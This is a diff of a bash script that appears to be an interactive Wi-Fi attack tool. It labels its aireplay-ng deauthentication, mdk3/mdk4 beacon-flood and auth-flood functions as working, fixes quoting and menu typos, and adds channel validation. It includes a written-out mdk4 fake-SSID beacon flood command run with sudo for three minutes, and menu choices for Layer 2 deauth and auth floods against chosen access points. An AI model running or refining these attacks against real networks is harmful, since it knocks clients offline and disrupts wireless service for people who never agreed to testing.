@@ -121,7 +121,7 @@ Clears_CSV() { #edit the core function of clearing csv files here
     sleep 1
 }
 
-For_aireplay () {
+For_aireplay () { #works
     echo "setting up aireplay-ng deauth attack"
     #also recommend to use the desktop directory for this for testing
     sleep 1
@@ -189,7 +189,7 @@ Just_Analysis () { #edit the core function of analysis here
     Just_Filter
 }
 
-For_mdk3 () {
+For_mdk3 () { #works
     echo "you chose to use randon SSID beacon flood"
     while true; do
         read -p "which channel do you want to flood?: " channel
@@ -209,7 +209,7 @@ For_mdk3 () {
     done
 }
 
-For_mdk4 () {
+For_mdk4 () { #works
     echo "you chose to choose a fake SSID beacon flood"
     read -p "which SSID/name do you want to use?: " SSID
     echo "your fake AP is $SSID"
@@ -223,14 +223,14 @@ For_mdk4 () {
             echo "starting mdk4 fake SSID beacon flood"
             echo "cancel the attack early with ctrl c"
             echo "running for 3 minutes"
-            sudo timeout 180 mdk4 wlan0 b -n $SSID -c $channel
+            sudo timeout 180 mdk4 wlan0 b -n $SSID -c "$channel"
             sleep 2
             break
         fi
     done
 }
 
-For_Analysis () {
+For_Analysis () { #works
     read -p "do you want to continue with nearby AP analysis? (y/n): " For
     if [ $For == "n" ]; then
         echo "returning"
@@ -244,7 +244,7 @@ For_Analysis () {
     cat bssid.csv | awk '{print}'
     sleep 1
     while true; do
-        echo -e "what next?/n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Auth Flood\n5) metrics\n6) Exit\n7) Return"
+        echo -e "what next?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Auth Flood\n5) metrics\n6) Exit\n7) Return"
         read -p "what's your choice: " attack2
         if [ $attack2 == 1 ]; then
             echo "you chose Layer 2 Deauth"
@@ -323,7 +323,7 @@ For_Auth_Flood () {
         read -p "what's your choice: " choice
         if [ $choice == 1 ]; then
             Just_Analysis
-            cat bssid1.csv | awk '{print $3}'
+            cat bssid.csv | awk '{print $3}' | sort
             read -p "which AP?: " AP
             echo "you chose $AP"
             # now confirm the AP exists
@@ -444,15 +444,21 @@ For_Layer1_Deauth () {
         if [ $OP == 1 ]; then
             read -p "Enter frequencey band you wish to use (2.4 or 5): " band
             if [ $band == 2.4 ]; then
-                band_op="2.4G"
+                band_op="2.4GHz"
             elif [ $band == 5 ]; then
-                band_op="5G"
+                band_op="5GHz"
             else
                 echo "exitting"
                 exit 1
             fi
         elif [ $OP == 2 ]; then
             read -p "Enter channel you wish to use: " channel
+            if [[ -n ${channel//[0-9]/} ]]; then
+                echo "invalid input, returning"
+                break
+            else
+                sudo iwconfig $interface channel $channel
+            fi
         elif [ $OP == 3 ]; then
             echo "returning"
             break
@@ -460,7 +466,6 @@ For_Layer1_Deauth () {
             echo "invalid input"
             continue
         fi
-        iwconfig $interface channel $channel
         read -p "would you like to continue? (y/n): " continue
         if [ $continue == "n" ]; then
             echo "returning"
